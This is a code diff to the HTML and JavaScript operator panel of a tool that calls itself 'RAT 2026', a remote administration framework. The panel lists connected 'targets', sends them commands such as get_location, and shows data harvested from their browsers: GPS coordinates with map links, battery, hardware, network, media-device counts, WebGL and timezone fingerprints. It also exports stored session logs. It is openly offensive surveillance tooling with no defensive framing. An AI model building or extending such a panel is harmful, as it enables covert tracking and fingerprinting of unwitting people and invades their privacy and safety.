@@ -140,7 +140,7 @@
 
     .main-content {
       display: grid;
-      grid-template-rows: auto 1fr auto;
+      grid-template-rows: auto 1fr;
       gap: 20px;
     }
 
@@ -180,74 +180,49 @@
       transform: translateY(-3px);
     }
 
-    .terminal {
-      background: #000;
-      border: 2px solid #00ff00;
-      border-radius: 10px;
-      padding: 20px;
-      height: 100%;
-      overflow-y: auto;
-      font-size: 13px;
-      line-height: 1.8;
-      box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
-    }
-
-    .terminal-line {
-      margin-bottom: 8px;
-      animation: fadeIn 0.3s;
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateX(-10px); }
-      to { opacity: 1; transform: translateX(0); }
-    }
-
-    .terminal-output {
-      color: #00ff00;
-    }
-
-    .terminal-error {
-      color: #ff0066;
-    }
-
-    .terminal-success {
-      color: #00ff00;
-      font-weight: bold;
-    }
-
-    .target-details {
+    .data-display {
       background: #111;
       border: 2px solid #00ff00;
       border-radius: 10px;
       padding: 20px;
+      overflow-y: auto;
       box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
     }
 
-    .details-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-      gap: 15px;
-      margin-top: 15px;
-    }
-
-    .detail-card {
-      background: linear-gradient(135deg, #0a0e27 0%, #1a1e37 100%);
+    .data-section {
+      background: #0a0e27;
       border: 1px solid #00ff00;
       border-radius: 8px;
       padding: 15px;
+      margin-bottom: 15px;
     }
 
-    .detail-label {
-      font-size: 11px;
-      color: #66ff66;
-      text-transform: uppercase;
-      margin-bottom: 8px;
-    }
-
-    .detail-value {
-      font-size: 14px;
+    .data-title {
       color: #00ffff;
+      font-size: 16px;
       font-weight: bold;
+      margin-bottom: 10px;
+      padding-bottom: 8px;
+      border-bottom: 1px solid #00ff00;
+    }
+
+    .data-item {
+      display: flex;
+      justify-content: space-between;
+      padding: 8px 0;
+      border-bottom: 1px solid rgba(0, 255, 0, 0.1);
+    }
+
+    .data-label {
+      color: #66ff66;
+      font-size: 12px;
+    }
+
+    .data-value {
+      color: #00ff00;
+      font-size: 12px;
+      text-align: right;
+      max-width: 60%;
       word-break: break-word;
     }
 
@@ -306,7 +281,7 @@
     <div class="logo">
       <div class="logo-icon">⚡</div>
       <div class="logo-text">
-        <h1>RAT 2026</h1>
+        <h1>RAT 2026 - COMPLETE</h1>
         <p>Advanced Remote Administration Framework</p>
       </div>
     </div>
@@ -331,7 +306,7 @@
       <div class="section-title">📡 CONNECTED TARGETS</div>
       <div class="btn-group">
         <button class="action-btn" onclick="refreshTargets()">🔄 Refresh</button>
-        <button class="action-btn" onclick="clearAll()">🗑️ Clear</button>
+        <button class="action-btn" onclick="viewLogs()">📋 Logs</button>
       </div>
       <div id="targetList" style="margin-top: 20px;">
         <div style="text-align: center; padding: 40px; opacity: 0.5;">
@@ -347,27 +322,19 @@
         <div class="command-grid">
           <button class="cmd-btn" onclick="sendCommand('get_location')">📍 Get Location</button>
           <button class="cmd-btn" onclick="sendCommand('get_battery')">🔋 Battery Info</button>
-          <button class="cmd-btn" onclick="sendCommand('get_all')">💾 Full Data</button>
-          <button class="cmd-btn" onclick="sendCommand('refresh')">🔄 Refresh Page</button>
-          <button class="cmd-btn" onclick="clearTerminal()">🗑️ Clear Term</button>
-          <button class="cmd-btn" onclick="exportData()">💾 Export Data</button>
+          <button class="cmd-btn" onclick="sendCommand('get_all')">💾 Full Refresh</button>
+          <button class="cmd-btn" onclick="sendCommand('refresh')">🔄 Reload Page</button>
+          <button class="cmd-btn" onclick="viewJSON()">📊 View JSON</button>
+          <button class="cmd-btn" onclick="exportData()">💾 Export All</button>
         </div>
       </div>
 
-      <div class="terminal" id="terminal">
-        <div class="terminal-line terminal-success">
-          [RAT2026] System initialized. Advanced RAT Framework v2.0
-        </div>
-        <div class="terminal-line terminal-output">
-          [*] Waiting for incoming connections...
-        </div>
-      </div>
-
-      <div class="target-details" id="targetDetails">
-        <div class="section-title">📊 TARGET INFORMATION</div>
-        <div style="text-align: center; padding: 40px; opacity: 0.5;">
-          <div style="font-size: 48px; margin-bottom: 15px;">🎯</div>
-          <div>Select a target to view detailed information</div>
+      <div class="data-display" id="dataDisplay">
+        <div class="section-title">📊 TARGET DATA - COMPLETE VIEW</div>
+        <div style="text-align: center; padding: 60px; opacity: 0.5;">
+          <div style="font-size: 64px; margin-bottom: 20px;">🎯</div>
+          <div style="font-size: 18px;">Select a target to view ALL collected data</div>
+          <div style="font-size: 12px; margin-top: 10px; color: #66ff66;">GPS • Battery • System • Network • Hardware • Fingerprints</div>
         </div>
       </div>
     </div>
@@ -376,21 +343,7 @@
   <script>
     let selectedTarget = null;
     let commandCount = 0;
-
-    function addToTerminal(text, type = 'output') {
-      const terminal = document.getElementById('terminal');
-      const line = document.createElement('div');
-      line.className = `terminal-line terminal-${type}`;
-      const timestamp = new Date().toLocaleTimeString();
-      line.textContent = `[${timestamp}] ${text}`;
-      terminal.appendChild(line);
-      terminal.scrollTop = terminal.scrollHeight;
-    }
-
-    function clearTerminal() {
-      document.getElementById('terminal').innerHTML = 
-        '<div class="terminal-line terminal-success">[RAT2026] Terminal cleared</div>';
-    }
+    let allTargets = [];
 
     async function refreshTargets() {
       try {
@@ -401,22 +354,26 @@
         targetList.innerHTML = '';
         
         if (data.targets && data.targets.length > 0) {
+          allTargets = data.targets;
           document.getElementById('totalTargets').textContent = data.targets.length;
           document.getElementById('activeTargets').textContent = data.targets.length;
           
           data.targets.forEach(target => {
             const item = document.createElement('div');
             item.className = 'target-item';
-            if (selectedTarget === target.sessionId) {
+            if (selectedTarget && selectedTarget.sessionId === target.sessionId) {
               item.classList.add('active');
             }
             
+            const locationStatus = target.location && !target.location.error ? '✓ GPS' : '✗ GPS';
+            const batteryStatus = target.battery && target.battery.level ? target.battery.level : 'N/A';
+            
             item.innerHTML = `
-              <div class="target-id">${target.sessionId.substr(0, 20)}...</div>
+              <div class="target-id">${target.sessionId.substr(0, 24)}...</div>
               <div class="target-info">
                 Platform: ${target.platform || 'Unknown'}<br>
-                Location: ${target.location ? '✓ Captured' : '✗ Pending'}<br>
-                Battery: ${target.battery ? target.battery.level : 'N/A'}
+                ${locationStatus} | Battery: ${batteryStatus}<br>
+                Time: ${new Date(target.timestamp).toLocaleTimeString()}
               </div>
             `;
             
@@ -424,7 +381,7 @@
             targetList.appendChild(item);
           });
           
-          addToTerminal(`Refreshed: ${data.targets.length} target(s) active`);
+          console.log(`[ADMIN] Loaded ${data.targets.length} targets`);
         } else {
           targetList.innerHTML = `
             <div style="text-align: center; padding: 40px; opacity: 0.5;">
@@ -434,58 +391,147 @@
           `;
         }
       } catch (e) {
-        addToTerminal('Error refreshing targets: ' + e.message, 'error');
+        console.error('[ADMIN] Refresh error:', e);
       }
     }
 
     function selectTarget(target) {
-      selectedTarget = target.sessionId;
-      addToTerminal(`Selected target: ${target.sessionId}`, 'success');
+      selectedTarget = target;
+      console.log('[ADMIN] Selected target:', target);
       refreshTargets();
+      displayCompleteData(target);
+    }
+
+    function displayCompleteData(target) {
+      const display = document.getElementById('dataDisplay');
       
-      const detailsDiv = document.getElementById('targetDetails');
-      detailsDiv.innerHTML = `
-        <div class="section-title">📊 TARGET - ${target.sessionId.substr(0, 20)}...</div>
-        <div class="details-grid">
-          <div class="detail-card">
-            <div class="detail-label">Session ID</div>
-            <div class="detail-value">${target.sessionId}</div>
-          </div>
-          <div class="detail-card">
-            <div class="detail-label">Platform</div>
-            <div class="detail-value">${target.platform || 'N/A'}</div>
-          </div>
-          <div class="detail-card">
-            <div class="detail-label">User Agent</div>
-            <div class="detail-value">${target.userAgent ? target.userAgent.substring(0, 50) + '...' : 'N/A'}</div>
-          </div>
-          <div class="detail-card">
-            <div class="detail-label">Screen</div>
-            <div class="detail-value">${target.screen ? target.screen.width + 'x' + target.screen.height : 'N/A'}</div>
-          </div>
-          <div class="detail-card">
-            <div class="detail-label">CPU Cores</div>
-            <div class="detail-value">${target.hardware ? target.hardware.cpuCores : 'N/A'}</div>
-          </div>
-          <div class="detail-card">
-            <div class="detail-label">Memory</div>
-            <div class="detail-value">${target.hardware ? target.hardware.deviceMemory + ' GB' : 'N/A'}</div>
-          </div>
-          <div class="detail-card">
-            <div class="detail-label">Battery</div>
-            <div class="detail-value">${target.battery ? target.battery.level : 'N/A'}</div>
-          </div>
-          <div class="detail-card">
-            <div class="detail-label">Location</div>
-            <div class="detail-value">${target.location && !target.location.error ? target.location.latitude + ', ' + target.location.longitude : 'Not captured'}</div>
-          </div>
-        </div>
-      `;
+      let html = `<div class="section-title">📊 COMPLETE DATA - ${target.sessionId.substr(0, 30)}...</div>`;
+      
+      // SESSION INFO
+      html += `<div class="data-section">
+        <div class="data-title">🔐 SESSION INFORMATION</div>
+        <div class="data-item"><span class="data-label">Session ID:</span><span class="data-value">${target.sessionId}</span></div>
+        <div class="data-item"><span class="data-label">Timestamp:</span><span class="data-value">${target.timestamp}</span></div>
+      </div>`;
+      
+      // LOCATION DATA
+      if (target.location) {
+        html += `<div class="data-section">
+          <div class="data-title">📍 GPS LOCATION</div>`;
+        if (target.location.error) {
+          html += `<div class="data-item"><span class="data-label">Status:</span><span class="data-value" style="color: #ff0066;">${target.location.error}</span></div>`;
+        } else {
+          html += `
+            <div class="data-item"><span class="data-label">Latitude:</span><span class="data-value">${target.location.latitude}</span></div>
+            <div class="data-item"><span class="data-label">Longitude:</span><span class="data-value">${target.location.longitude}</span></div>
+            <div class="data-item"><span class="data-label">Accuracy:</span><span class="data-value">${target.location.accuracy}</span></div>
+            <div class="data-item"><span class="data-label">Altitude:</span><span class="data-value">${target.location.altitude}</span></div>
+            <div class="data-item"><span class="data-label">Speed:</span><span class="data-value">${target.location.speed}</span></div>
+            <div class="data-item"><span class="data-label">Heading:</span><span class="data-value">${target.location.heading}</span></div>
+            <div class="data-item"><span class="data-label">Google Maps:</span><span class="data-value"><a href="https://maps.google.com/?q=${target.location.latitude},${target.location.longitude}" target="_blank" style="color: #00ffff;">View Map</a></span></div>
+          `;
+        }
+        html += `</div>`;
+      }
+      
+      // BATTERY DATA
+      if (target.battery) {
+        html += `<div class="data-section">
+          <div class="data-title">🔋 BATTERY INFORMATION</div>
+          <div class="data-item"><span class="data-label">Level:</span><span class="data-value">${target.battery.level || 'N/A'}</span></div>
+          <div class="data-item"><span class="data-label">Charging:</span><span class="data-value">${target.battery.charging ? 'Yes' : 'No'}</span></div>
+          <div class="data-item"><span class="data-label">Charging Time:</span><span class="data-value">${target.battery.chargingTime}</span></div>
+          <div class="data-item"><span class="data-label">Discharging Time:</span><span class="data-value">${target.battery.dischargingTime}</span></div>
+        </div>`;
+      }
+      
+      // SYSTEM INFO
+      html += `<div class="data-section">
+        <div class="data-title">💻 SYSTEM INFORMATION</div>
+        <div class="data-item"><span class="data-label">Platform:</span><span class="data-value">${target.platform}</span></div>
+        <div class="data-item"><span class="data-label">User Agent:</span><span class="data-value">${target.userAgent}</span></div>
+        <div class="data-item"><span class="data-label">Language:</span><span class="data-value">${target.language}</span></div>
+      </div>`;
+      
+      // SCREEN INFO
+      if (target.screen) {
+        html += `<div class="data-section">
+          <div class="data-title">🖥️ SCREEN INFORMATION</div>
+          <div class="data-item"><span class="data-label">Resolution:</span><span class="data-value">${target.screen.width}x${target.screen.height}</span></div>
+          <div class="data-item"><span class="data-label">Available:</span><span class="data-value">${target.screen.availWidth}x${target.screen.availHeight}</span></div>
+          <div class="data-item"><span class="data-label">Color Depth:</span><span class="data-value">${target.screen.colorDepth} bits</span></div>
+          <div class="data-item"><span class="data-label">Orientation:</span><span class="data-value">${target.screen.orientation}</span></div>
+        </div>`;
+      }
+      
+      // HARDWARE INFO
+      if (target.hardware) {
+        html += `<div class="data-section">
+          <div class="data-title">⚙️ HARDWARE INFORMATION</div>
+          <div class="data-item"><span class="data-label">CPU Cores:</span><span class="data-value">${target.hardware.cpuCores}</span></div>
+          <div class="data-item"><span class="data-label">Device Memory:</span><span class="data-value">${target.hardware.deviceMemory} GB</span></div>
+          <div class="data-item"><span class="data-label">Max Touch Points:</span><span class="data-value">${target.hardware.maxTouchPoints}</span></div>
+        </div>`;
+      }
+      
+      // NETWORK INFO
+      if (target.connection) {
+        html += `<div class="data-section">
+          <div class="data-title">🌐 NETWORK INFORMATION</div>
+          <div class="data-item"><span class="data-label">Type:</span><span class="data-value">${target.connection.effectiveType || target.connection.type}</span></div>
+          <div class="data-item"><span class="data-label">Downlink:</span><span class="data-value">${target.connection.downlink} Mbps</span></div>
+          <div class="data-item"><span class="data-label">RTT:</span><span class="data-value">${target.connection.rtt} ms</span></div>
+          <div class="data-item"><span class="data-label">Save Data:</span><span class="data-value">${target.connection.saveData ? 'Enabled' : 'Disabled'}</span></div>
+        </div>`;
+      }
+      
+      // TIMEZONE INFO
+      if (target.timezone) {
+        html += `<div class="data-section">
+          <div class="data-title">🌍 TIMEZONE & LOCALE</div>
+          <div class="data-item"><span class="data-label">Timezone:</span><span class="data-value">${target.timezone.zone}</span></div>
+          <div class="data-item"><span class="data-label">Offset:</span><span class="data-value">${target.timezone.offset} minutes</span></div>
+          <div class="data-item"><span class="data-label">Locale:</span><span class="data-value">${target.timezone.locale}</span></div>
+        </div>`;
+      }
+      
+      // MEDIA DEVICES
+      if (target.mediaDevices) {
+        html += `<div class="data-section">
+          <div class="data-title">📱 MEDIA DEVICES</div>
+          <div class="data-item"><span class="data-label">Audio Input:</span><span class="data-value">${target.mediaDevices.audioInput} device(s)</span></div>
+          <div class="data-item"><span class="data-label">Audio Output:</span><span class="data-value">${target.mediaDevices.audioOutput} device(s)</span></div>
+          <div class="data-item"><span class="data-label">Video Input:</span><span class="data-value">${target.mediaDevices.videoInput} device(s)</span></div>
+          <div class="data-item"><span class="data-label">Total Devices:</span><span class="data-value">${target.mediaDevices.total}</span></div>
+        </div>`;
+      }
+      
+      // WEBGL INFO
+      if (target.webgl) {
+        html += `<div class="data-section">
+          <div class="data-title">🎨 WebGL RENDERER</div>
+          <div class="data-item"><span class="data-label">Vendor:</span><span class="data-value">${target.webgl.vendor}</span></div>
+          <div class="data-item"><span class="data-label">Renderer:</span><span class="data-value">${target.webgl.renderer}</span></div>
+          <div class="data-item"><span class="data-label">Version:</span><span class="data-value">${target.webgl.version}</span></div>
+        </div>`;
+      }
+      
+      // BROWSER INFO
+      if (target.browser) {
+        html += `<div class="data-section">
+          <div class="data-title">🌐 BROWSER DETAILS</div>
+          <div class="data-item"><span class="data-label">Cookies:</span><span class="data-value">${target.browser.cookieEnabled ? 'Enabled' : 'Disabled'}</span></div>
+          <div class="data-item"><span class="data-label">Do Not Track:</span><span class="data-value">${target.browser.doNotTrack}</span></div>
+          <div class="data-item"><span class="data-label">Online:</span><span class="data-value">${target.browser.onLine ? 'Yes' : 'No'}</span></div>
+          <div class="data-item"><span class="data-label">Vendor:</span><span class="data-value">${target.browser.vendor}</span></div>
+        </div>`;
+      }
+      
+      display.innerHTML = html;
     }
 
     async function sendCommand(cmd) {
       if (!selectedTarget) {
-        addToTerminal('Error: No target selected', 'error');
         alert('Please select a target first!');
         return;
       }
@@ -495,7 +541,7 @@
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            session: selectedTarget,
+            session: selectedTarget.sessionId,
             command: cmd
           })
         });
@@ -504,29 +550,38 @@
         if (result.success) {
           commandCount++;
           document.getElementById('commandsSent').textContent = commandCount;
-          addToTerminal(`Command sent: ${cmd} → ${selectedTarget.substr(0, 20)}...`, 'success');
-        } else {
-          addToTerminal(`Command failed: ${result.error}`, 'error');
+          console.log(`[ADMIN] Command sent: ${cmd}`);
+          
+          // Refresh after command
+          setTimeout(refreshTargets, 2000);
         }
       } catch (e) {
-        addToTerminal(`Error: ${e.message}`, 'error');
+        console.error('[ADMIN] Command error:', e);
       }
+    }
+
+    function viewJSON() {
+      if (!selectedTarget) {
+        alert('Please select a target first!');
+        return;
+      }
+      const json = JSON.stringify(selectedTarget, null, 2);
+      const win = window.open('', '_blank');
+      win.document.write('<pre style="background:#000;color:#0f0;padding:20px;font-family:monospace;">' + json + '</pre>');
     }
 
     function exportData() {
-      addToTerminal('Exporting data...', 'output');
       window.open('data/rat_sessions.json', '_blank');
     }
 
-    function clearAll() {
-      if (confirm('Clear all data?')) {
-        addToTerminal('Data cleared', 'success');
-        refreshTargets();
-      }
+    function viewLogs() {
+      const today = new Date().toISOString().split('T')[0];
+      window.open(`data/logs/rat_${today}.txt`, '_blank');
     }
 
+    // Auto-refresh every 5 seconds
     window.onload = () => {
-      addToTerminal('RAT 2026 Control Panel initialized', 'success');
+      console.log('[ADMIN] Control panel loaded');
       refreshTargets();
       setInterval(refreshTargets, 5000);
     };
